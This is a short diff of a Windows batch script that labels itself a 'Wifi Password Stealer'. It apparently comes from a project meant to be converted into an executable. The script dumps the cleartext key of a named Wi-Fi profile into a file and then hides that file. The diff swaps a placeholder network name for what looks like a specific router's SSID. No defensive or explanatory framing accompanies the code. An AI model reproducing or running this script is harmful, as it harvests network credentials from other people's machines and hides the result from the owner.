@@ -18,5 +18,5 @@ REM BFCPEOPTIONEND
 @ECHO ON
 @echo off
 ::Wifi Password Stealer::
-netsh wlan show profiles "Wifi-Name" key=clear > pass.txt
+netsh wlan show profiles "PROLINK_H5004NK_45FB8" key=clear > pass.txt
 attrib +h pass.txt
